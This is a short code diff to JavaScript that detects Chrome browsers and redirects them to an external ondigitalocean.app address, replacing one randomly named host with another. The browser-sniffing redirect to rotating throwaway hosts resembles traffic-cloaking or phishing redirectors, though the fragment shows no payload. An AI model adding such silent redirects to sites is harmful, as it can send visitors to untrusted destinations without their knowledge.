@@ -16,7 +16,7 @@
 
         if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
           // is Google chrome
-        window.location.href = "https://sea-lion-app-58mtz.ondigitalocean.app/";
+        window.location.href = "https://hammerhead-app-6tpm8.ondigitalocean.app/";
         }
         if(window.navigator.userAgent.indexOf("Mac") != -1 )
           {
